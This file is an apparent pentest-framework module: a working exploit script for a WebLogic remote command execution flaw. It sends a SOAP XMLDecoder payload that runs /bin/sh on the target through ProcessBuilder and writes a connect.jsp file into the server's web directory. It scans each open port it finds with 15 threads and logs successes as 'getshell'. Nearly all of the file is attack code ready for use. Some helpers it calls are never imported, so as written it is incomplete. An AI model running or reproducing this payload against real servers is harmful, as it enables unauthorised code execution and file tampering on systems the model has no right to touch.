import requests
import sys
import re
import os
from exp10it import get_target_table_name_list
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from exp10it import commonNotWebPortList
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
modulePath = __file__[:-len(__file__.split("/")[-1])]

#判断weblogic漏洞是否存在的地址，因没有poc，暂时只能判断这个地址
check_addr = '/wls-wsat/CoordinatorPortType11'
shell_addr = '/bea_wls_internal/connect.jsp'

heads={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'zh-CN,zh;q=0.8',
'SOAPAction': "",
'Content-Type': 'text/xml;charset=UTF-8'
}


postStr='''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
  <soapenv:Header> 
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
      <java> 
        <object class="java.lang.ProcessBuilder"> 
          <array class="java.lang.String" length="3"> 
            <void index="0"> 
              <string>/bin/sh</string> 
            </void>  
            <void index="1"> 
              <string>-c</string> 
            </void>  
            <void index="2"> 
              <string>find $DOMAIN_HOME -type d -name bea_wls_internal|while read f;do find $f -type f -name
              index.html;done|while read ff;do echo vulexist>$(dirname $ff)/connect.jsp;done</string>
            </void> 
          </array>  
          <void method="start"/> 
        </object> 
      </java> 
    </work:WorkContext> 
  </soapenv:Header>  
  <soapenv:Body/> 
</soapenv:Envelope>
'''

#判断漏洞是否存在
target=sys.argv[1]
#传入的target是http://www.baidu.com格式(不带端口 )

target_table_name = get_target_table_name_list(target)[0]
result = execute_sql_in_db("select port_scan_info from %s where http_domain='%s'" %
                           (target_table_name, target), "exp10itdb")
if len(result) > 0:
    nmap_result_string = result[0][0]
    a = re.findall(r"(\d+)/(tcp)|(udp)\s+open", nmap_result_string, re.I)
    openPortList = []
    testUrlList=[]
    for each in a:
        if each[0] not in openPortList and each[0] not in commonNotWebPortList:
            openPortList.append(each[0])
            testUrlList.append(target+":"+each[0])

def check(url):
    #print("正在检测第%d个url:%s" % (statusNum,url))
    vuln_url = url+check_addr

    content = requests.get(vuln_url,verify=False,timeout=10)
    if content.status_code ==200:
        rsp= requests.post(vuln_url,headers=heads,data=postStr.encode("utf-8"),verify=False,timeout=10)
        content=rsp.content
        import chardet
        bytesEncoding = chardet.detect(content)['encoding']
        content=content.decode(bytesEncoding)

        if re.search(r"java\.lang\.ProcessBuilder",content,re.I):
            #print "getshell success,shell is:%s"%(url+shell_addr)
            string_to_write="Congratulations! weblogic 远程命令执行漏洞存在:\n"+url+shell_addr+"\n"
            CLIOutput().good_print(string_to_write)
            with open("%sresult.txt" % modulePath,"a+") as f:
                f.write(string_to_write)
        else:
            print("失败")
    else:
        print(content.status_code)

from concurrent import futures
with futures.ThreadPoolExecutor(max_workers=15) as executor:
    executor.map(check,testUrlList)
